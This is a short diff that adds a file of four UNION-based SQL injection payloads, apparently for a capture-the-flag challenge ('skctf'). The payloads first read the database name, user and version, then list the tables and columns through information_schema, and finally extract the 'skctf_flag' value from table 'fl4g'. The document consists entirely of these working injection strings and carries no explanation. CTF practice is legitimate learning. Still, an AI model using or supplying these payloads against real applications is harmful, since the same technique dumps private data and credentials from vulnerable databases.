@@ -1,0 +1,4 @@
+0' union select 1,database(),user(),version() #
+0' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='skctf'),3,4 #
+0' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='fl4g'),3,4 #
+0' union select 1,(select skctf_flag from fl4g),3,4 #
